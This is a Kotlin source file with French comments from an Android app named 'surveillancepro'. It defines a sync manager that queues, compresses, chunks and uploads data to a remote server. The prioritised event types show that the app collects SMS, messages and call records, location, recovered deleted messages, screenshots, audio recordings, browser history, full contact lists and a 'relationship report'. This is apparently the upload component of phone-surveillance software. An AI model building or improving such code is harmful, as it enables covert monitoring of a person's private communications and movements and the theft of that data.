package com.surveillancepro.android.data

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.util.Base64
import android.util.Log
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.ConcurrentLinkedQueue
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

/**
 * Gestionnaire de Synchronisation Intelligent
 * 
 * PROBLÈME RÉSOLU:
 * - Les données lourdes (images, audio) bloquent la synchronisation
 * - Le "pont" entre téléphone et serveur peut être saturé
 * 
 * SOLUTIONS IMPLÉMENTÉES:
 * 1. Compression intelligente des images (qualité adaptative)
 * 2. Envoi par chunks (morceaux) pour les gros fichiers
 * 3. File d'attente avec priorités (messages > photos > audio)
 * 4. Retry automatique avec backoff exponentiel
 * 5. Détection de la qualité réseau (WiFi vs 4G)
 * 6. Envoi parallèle pour les petits événements
 */
object SmartSyncManager {
    
    private const val TAG = "SmartSync"
    
    // Configuration
    private const val MAX_PAYLOAD_SIZE = 500 * 1024 // 500 KB max par requête
    private const val CHUNK_SIZE = 200 * 1024 // 200 KB par chunk
    private const val MAX_PARALLEL_REQUESTS = 3
    private const val MAX_RETRY_ATTEMPTS = 3
    private const val BASE_RETRY_DELAY_MS = 1000L
    
    // Qualité d'image selon le réseau
    private const val QUALITY_WIFI = 70
    private const val QUALITY_4G = 50
    private const val QUALITY_3G = 30
    
    // File d'attente prioritaire
    private val highPriorityQueue = ConcurrentLinkedQueue<SyncItem>() // Messages, alertes
    private val normalPriorityQueue = ConcurrentLinkedQueue<SyncItem>() // Photos, screenshots
    private val lowPriorityQueue = ConcurrentLinkedQueue<SyncItem>() // Audio, historique
    
    private val isSyncing = AtomicBoolean(false)
    private val activeRequests = AtomicInteger(0)
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()
    
    /**
     * Ajoute un événement à la file de synchronisation.
     * L'événement sera compressé et envoyé selon sa priorité.
     */
    fun enqueue(context: Context, type: String, payload: Map<String, Any>) {
        val priority = getPriority(type)
        val item = SyncItem(type, payload, priority, System.currentTimeMillis())
        
        when (priority) {
            Priority.HIGH -> highPriorityQueue.add(item)
            Priority.NORMAL -> normalPriorityQueue.add(item)
            Priority.LOW -> lowPriorityQueue.add(item)
        }
        
        Log.d(TAG, "Enqueued: $type (priority: $priority)")
        
        // Démarrer la sync si pas déjà en cours
        if (!isSyncing.get()) {
            startSync(context)
        }
    }
    
    /**
     * Détermine la priorité d'un événement.
     */
    private fun getPriority(type: String): Priority {
        return when {
            // HAUTE priorité - Messages et alertes (petits, urgents)
            type.contains("message") || type.contains("sms") || 
            type.contains("alert") || type.contains("call") ||
            type == "location" || type == "sim_change_alert" ||
            type == "deleted_message_recovered" || type == "suspicious_message_alert" -> Priority.HIGH
            
            // NORMALE priorité - Photos et screenshots
            type.contains("photo") || type.contains("screenshot") ||
            type.contains("rapid_screenshot") || type == "story_detected" -> Priority.NORMAL
            
            // BASSE priorité - Audio et données volumineuses
            type.contains("audio") || type.contains("recording") ||
            type == "browser_history" || type == "contacts_full" ||
            type == "relationship_report" -> Priority.LOW
            
            else -> Priority.NORMAL
        }
    }
    
    /**
     * Démarre la synchronisation intelligente.
     */
    fun startSync(context: Context) {
        if (isSyncing.getAndSet(true)) return
        
        scope.launch {
            try {
                val storage = DeviceStorage.getInstance(context)
                if (!storage.hasAccepted || storage.deviceToken == null) {
                    isSyncing.set(false)
                    return@launch
                }
                
                val networkQuality = getNetworkQuality(context)
                Log.d(TAG, "Starting sync (network: $networkQuality)")
                
                // Traiter les files par priorité
                while (hasItemsToSync()) {
                    // Haute priorité d'abord
                    while (highPriorityQueue.isNotEmpty() && activeRequests.get() < MAX_PARALLEL_REQUESTS) {
                        val item = highPriorityQueue.poll() ?: break
                        processItem(context, item, networkQuality)
                    }
                    
                    // Puis normale
                    while (normalPriorityQueue.isNotEmpty() && activeRequests.get() < MAX_PARALLEL_REQUESTS) {
                        val item = normalPriorityQueue.poll() ?: break
                        processItem(context, item, networkQuality)
                    }
                    
                    // Puis basse (seulement si WiFi ou peu d'activité)
                    if (networkQuality == NetworkQuality.WIFI || activeRequests.get() == 0) {
                        while (lowPriorityQueue.isNotEmpty() && activeRequests.get() < MAX_PARALLEL_REQUESTS) {
                            val item = lowPriorityQueue.poll() ?: break
                            processItem(context, item, networkQuality)
                        }
                    }
                    
                    // Attendre un peu si toutes les requêtes sont actives
                    if (activeRequests.get() >= MAX_PARALLEL_REQUESTS) {
                        delay(100)
                    }
                }
                
                // Attendre que toutes les requêtes se terminent
                while (activeRequests.get() > 0) {
                    delay(100)
                }
                
                Log.d(TAG, "Sync complete")
                
            } catch (e: Exception) {
                Log.e(TAG, "Sync error: ${e.message}")
            } finally {
                isSyncing.set(false)
            }
        }
    }
    
    /**
     * Traite un élément de la file.
     */
    private fun processItem(context: Context, item: SyncItem, networkQuality: NetworkQuality) {
        scope.launch {
            activeRequests.incrementAndGet()
            try {
                // Optimiser le payload selon le type
                val optimizedPayload = optimizePayload(item.type, item.payload, networkQuality)
                
                // Vérifier la taille
                val payloadJson = JSONObject(optimizedPayload).toString()
                
                if (payloadJson.length > MAX_PAYLOAD_SIZE) {
                    // Trop gros - envoyer en chunks
                    sendInChunks(context, item.type, optimizedPayload)
                } else {
                    // Taille OK - envoyer directement
                    sendEvent(context, item.type, optimizedPayload)
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Process item error: ${e.message}")
                // Remettre dans la file si retry possible
                if (item.retryCount < MAX_RETRY_ATTEMPTS) {
                    item.retryCount++
                    delay(BASE_RETRY_DELAY_MS * item.retryCount)
                    when (item.priority) {
                        Priority.HIGH -> highPriorityQueue.add(item)
                        Priority.NORMAL -> normalPriorityQueue.add(item)
                        Priority.LOW -> lowPriorityQueue.add(item)
                    }
                }
            } finally {
                activeRequests.decrementAndGet()
            }
        }
    }
    
    /**
     * Optimise le payload (compression des images, etc.)
     */
    private fun optimizePayload(type: String, payload: Map<String, Any>, networkQuality: NetworkQuality): Map<String, Any> {
        val result = payload.toMutableMap()
        
        // Compression des images
        val imageKey = when {
            payload.containsKey("imageBase64") -> "imageBase64"
            payload.containsKey("thumbnailBase64") -> "thumbnailBase64"
            else -> null
        }
        
        if (imageKey != null) {
            val imageBase64 = payload[imageKey] as? String
            if (imageBase64 != null && imageBase64.length > 50000) { // > 50KB
                val quality = when (networkQuality) {
                    NetworkQuality.WIFI -> QUALITY_WIFI
                    NetworkQuality.GOOD_4G -> QUALITY_4G
                    NetworkQuality.SLOW -> QUALITY_3G
                }
                val compressed = compressImage(imageBase64, quality)
                result[imageKey] = compressed
                Log.d(TAG, "Image compressed: ${imageBase64.length} -> ${compressed.length} bytes")
            }
        }
        
        // Compression de l'audio (réduire le sample rate si nécessaire)
        if (payload.containsKey("audioBase64") && networkQuality != NetworkQuality.WIFI) {
            // Pour l'audio, on garde tel quel mais on note la qualité réseau
            result["networkQuality"] = networkQuality.name
        }
        
        return result
    }
    
    /**
     * Compresse une image Base64.
     */
    private fun compressImage(base64: String, quality: Int): String {
        return try {
            val bytes = Base64.decode(base64, Base64.DEFAULT)
            val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size) ?: return base64
            
            // Redimensionner si trop grand
            val maxDim = if (quality >= 60) 1280 else 720
            val scaledBitmap = if (bitmap.width > maxDim || bitmap.height > maxDim) {
                val scale = minOf(maxDim.toFloat() / bitmap.width, maxDim.toFloat() / bitmap.height)
                Bitmap.createScaledBitmap(
                    bitmap,
                    (bitmap.width * scale).toInt(),
                    (bitmap.height * scale).toInt(),
                    true
                )
            } else {
                bitmap
            }
            
            val outputStream = ByteArrayOutputStream()
            scaledBitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream)
            
            if (scaledBitmap != bitmap) {
                scaledBitmap.recycle()
            }
            bitmap.recycle()
            
            Base64.encodeToString(outputStream.toByteArray(), Base64.NO_WRAP)
        } catch (e: Exception) {
            Log.e(TAG, "Image compression failed: ${e.message}")
            base64
        }
    }
    
    /**
     * Envoie un événement en plusieurs morceaux.
     */
    private suspend fun sendInChunks(context: Context, type: String, payload: Map<String, Any>) {
        val storage = DeviceStorage.getInstance(context)
        val token = storage.deviceToken ?: return
        
        // Identifier le champ volumineux
        val largeField = payload.entries.find { 
            (it.value as? String)?.length ?: 0 > CHUNK_SIZE 
        }
        
        if (largeField == null) {
            // Pas de champ volumineux, envoyer normalement
            sendEvent(context, type, payload)
            return
        }
        
        val fieldName = largeField.key
        val fieldValue = largeField.value as String
        val totalChunks = (fieldValue.length + CHUNK_SIZE - 1) / CHUNK_SIZE
        val chunkId = "chunk_${System.currentTimeMillis()}"
        
        Log.d(TAG, "Sending in $totalChunks chunks: $type")
        
        for (i in 0 until totalChunks) {
            val start = i * CHUNK_SIZE
            val end = minOf(start + CHUNK_SIZE, fieldValue.length)
            val chunk = fieldValue.substring(start, end)
            
            val chunkPayload = payload.toMutableMap()
            chunkPayload[fieldName] = chunk
            chunkPayload["_chunkId"] = chunkId
            chunkPayload["_chunkIndex"] = i
            chunkPayload["_totalChunks"] = totalChunks
            chunkPayload["_isChunked"] = true
            
            sendEvent(context, type, chunkPayload)
            
            // Petit délai entre les chunks pour ne pas saturer
            delay(50)
        }
    }
    
    /**
     * Envoie un événement au serveur.
     */
    private suspend fun sendEvent(context: Context, type: String, payload: Map<String, Any>): Boolean {
        val storage = DeviceStorage.getInstance(context)
        val token = storage.deviceToken ?: return false
        
        return withContext(Dispatchers.IO) {
            try {
                val body = JSONObject().apply {
                    put("type", type)
                    put("payload", JSONObject(payload))
                    put("timestamp", System.currentTimeMillis())
                }.toString()
                
                val request = Request.Builder()
                    .url("${storage.serverURL}/api/events")
                    .addHeader("x-device-token", token)
                    .addHeader("Content-Type", "application/json")
                    .post(body.toRequestBody("application/json".toMediaType()))
                    .build()
                
                val response = client.newCall(request).execute()
                val success = response.isSuccessful
                
                if (success) {
                    Log.d(TAG, "Event sent: $type")
                } else {
                    Log.w(TAG, "Event failed: $type (${response.code})")
                }
                
                success
            } catch (e: Exception) {
                Log.e(TAG, "Send error: ${e.message}")
                false
            }
        }
    }
    
    /**
     * Détecte la qualité du réseau.
     */
    private fun getNetworkQuality(context: Context): NetworkQuality {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = cm.activeNetwork ?: return NetworkQuality.SLOW
        val capabilities = cm.getNetworkCapabilities(network) ?: return NetworkQuality.SLOW
        
        return when {
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> NetworkQuality.WIFI
            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_NOT_METERED) -> NetworkQuality.WIFI
            capabilities.linkDownstreamBandwidthKbps > 5000 -> NetworkQuality.GOOD_4G
            else -> NetworkQuality.SLOW
        }
    }
    
    /**
     * Vérifie s'il reste des éléments à synchroniser.
     */
    private fun hasItemsToSync(): Boolean {
        return highPriorityQueue.isNotEmpty() || 
               normalPriorityQueue.isNotEmpty() || 
               lowPriorityQueue.isNotEmpty()
    }
    
    /**
     * Retourne les statistiques de synchronisation.
     */
    fun getStats(): Map<String, Any> = mapOf(
        "isSyncing" to isSyncing.get(),
        "activeRequests" to activeRequests.get(),
        "highPriorityPending" to highPriorityQueue.size,
        "normalPriorityPending" to normalPriorityQueue.size,
        "lowPriorityPending" to lowPriorityQueue.size,
    )
    
    /**
     * Force la synchronisation immédiate de tous les éléments.
     */
    fun forceSync(context: Context) {
        if (!isSyncing.get()) {
            startSync(context)
        }
    }
    
    // Classes internes
    enum class Priority { HIGH, NORMAL, LOW }
    enum class NetworkQuality { WIFI, GOOD_4G, SLOW }
    
    data class SyncItem(
        val type: String,
        val payload: Map<String, Any>,
        val priority: Priority,
        val timestamp: Long,
        var retryCount: Int = 0
    )
}
